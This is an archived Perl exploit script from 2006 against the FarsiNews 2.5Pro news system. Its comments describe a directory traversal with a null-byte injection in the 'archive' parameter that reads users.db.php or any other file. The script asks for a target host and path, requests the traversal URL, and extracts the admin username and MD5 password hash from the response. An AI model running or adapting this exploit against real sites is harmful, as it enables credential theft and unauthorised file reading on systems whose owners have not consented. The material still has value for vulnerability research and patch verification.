<html><head><title>FarsiNews <= 2.5 Directory Traversal Arbitrary (users.db) Access Exploit</title></head><pre>#!/usr/bin/perl
#
# FarsiNews 2.5pro Show User&amp;Passowrd
# Exploit by Hessam-x (www.hessamx.net)
#
#
######################################################
#  ___ ___                __                         #
# /   |   \_____    ____ |  | __ ___________________ #
#/    ~    \__  \ _/ ___\|  |/ // __ \_  __ \___   / #
#\    Y    // __ \\  \___|    &lt;\  ___/|  | \//    /  #
# \___|_  /(____  /\___  &gt;__|_ \\___  &gt;__|  /_____ \ #
#       \/      \/     \/     \/    \/            \/ #
#             Iran Hackerz Security Team             #
#               WebSite: www.hackerz.ir              #
#                                                    #
######################################################
# Description                                        #
#                                                    #
# Name    : FarsiNews [www.farsinewsteam.com]        #
# version : 2.5Pro                                   #
######################################################
# in FarsiNews if you change the archive value :
# http://localhost/index.php?archive=hamid
# see :
# Warning: file([PATH]/data/archives/hamid.news.arch.php):
# failed to open stream: No such file or directory in [PATH]\inc\shows.inc.php on line 642
# Warning: file([PATH]/data/archives/hamid.comments.arch.php):
# failed to open stream: No such file or directory in [PATH]\inc\shows.inc.php on line 686
# ...[and many other error]
# it means that shows.inc.php  try to open  '/archives/hamid.news.arch.php'  (and also 'hamid.comments.arch.php')  to read it's data .
# we can change the archive value to '/../users.db.php%00' to see all username and password .
# Exploit :
# http://localhost/index.php?archive=/../users.db.php%00
# http://localhost/Farsi1/index.php?archive=/../[file-to-read]%00
# F0und by hamid
use LWP::Simple;

print &quot;-------------------------------------------\n&quot;;
print &quot;=             Farsinews 2.5Pro            =\n&quot;;
print &quot;=       By Hessam-x  - www.hackerz.ir     =\n&quot;;
print &quot;-------------------------------------------\n\n&quot;;


       print &quot;Target(www.example.com)\&gt; &quot;;
       chomp($targ = &lt;STDIN&gt;);

       print &quot;Path: (/fn25/)\&gt;&quot;;
       chomp($path=&lt;STDIN&gt;);

$url = &quot;index.php?archive=/../users.db.php%00&quot;;
$page = get(&quot;http://&quot;.$targ.$path.$url) || die &quot;[-] Unable to retrieve: $!&quot;;
print &quot;[+] Connected to: $targ\n&quot;;

$page =~ m/&lt;img alt=&quot;(.*?)&quot; src=/ &amp;&amp; print &quot;[+] Username:\n $1\n&quot;;
$page =~ m/style=&quot;border: none;&quot; align=&quot;right&quot; \/&gt;(.*?)&lt;\/font&gt;/ &amp;&amp; print &quot;[+] MD5 Password:\n $1\n&quot;;

print &quot;[-] Unable to retrieve User ID\n&quot; if(!$1);

# milw0rm.com [2006-02-28]</pre></html>